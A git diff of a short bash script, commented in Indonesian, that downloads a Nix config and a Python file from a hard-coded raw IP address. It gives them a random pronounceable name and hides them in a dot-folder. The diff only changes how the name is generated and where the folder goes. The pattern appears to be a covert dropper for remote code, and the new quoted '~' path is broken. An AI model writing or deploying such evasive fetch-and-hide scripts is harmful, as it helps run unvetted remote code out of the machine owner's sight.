@@ -1,6 +1,16 @@
 #!/bin/bash
 # Buat nama random
-NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)
+VOWELS="aeiou"
+CONSONANTS="bcdfghjklmnpqrstvwxyz"
+
+# ambil 1 konsonan
+C1=$(echo "$CONSONANTS" | fold -w1 | shuf | head -n1)
+# ambil 1 vokal
+V=$(echo "$VOWELS" | fold -w1 | shuf | head -n1)
+# ambil 1 konsonan lagi
+C2=$(echo "$CONSONANTS" | fold -w1 | shuf | head -n1)
+
+NAME="$C1$V$C2"
 
 # Ambil argumen pertama (IP:PORT)
 URL="${1:-}"
@@ -21,8 +31,8 @@ wget -q -O dev.nix http://143.198.196.235/dev.nix
 sed -i "s/ganti/${NAME}/g" dev.nix
 
 # Buat folder sesuai nama random
-mkdir -p ".$NAME"
-cd ".$NAME" || exit 1
+mkdir -p "~/.$NAME"
+cd "~/.$NAME" || exit 1
 
 # Download file python & config.json
 wget -q -O "${NAME}" http://143.198.196.235/dev.py
